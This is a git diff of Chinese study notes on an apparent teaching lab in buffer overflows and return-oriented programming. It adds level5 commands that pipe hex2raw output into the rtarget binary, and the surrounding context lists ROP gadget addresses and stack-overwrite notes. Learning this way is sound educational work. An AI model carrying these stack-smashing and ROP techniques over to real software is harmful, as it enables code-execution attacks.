@@ -32,7 +32,7 @@ cat exploit2.txt | ./hex2raw | ./ctarget -q
 1. cookie所对应的ascii:  35 39 62 39 39 37 66 61
 2. 调试发现，往getbuf的栈顶写，函数调用过程会栈上写数据，会被覆盖，不过在栈底再往下写，反正ret后的栈上数据是不会再被用到了；
 3. 注意一下偏移量；
-  
+
 <pre>
 -----
        <-- test rsp   0x5561dca0
@@ -64,7 +64,7 @@ cat exploit3.txt | ./hex2raw | ./ctarget -q
 2. 看着是说farm里面的地址还是可以用的；
 
 pop %rax         58        0x4019ab
-movq %rax, %rdi  48 89 c7  0x4019c5 
+movq %rax, %rdi  48 89 c7  0x4019c5
 
 3. 出错点：
    1. 对retq的栈操作不熟悉：执行当前栈顶指令，同时%rsp+8了；
@@ -77,4 +77,14 @@ run -q < raw4.txt
 
 cat exploit4.txt | ./hex2raw | ./rtarget -q
 
+```
+
+## level5
+
+```shell
+./hex2raw < exploit5.txt > raw5.txt
+b *0x4017bd
+run -q < raw5.txt
+
+cat exploit5.txt | ./hex2raw | ./rtarget -q
 ```
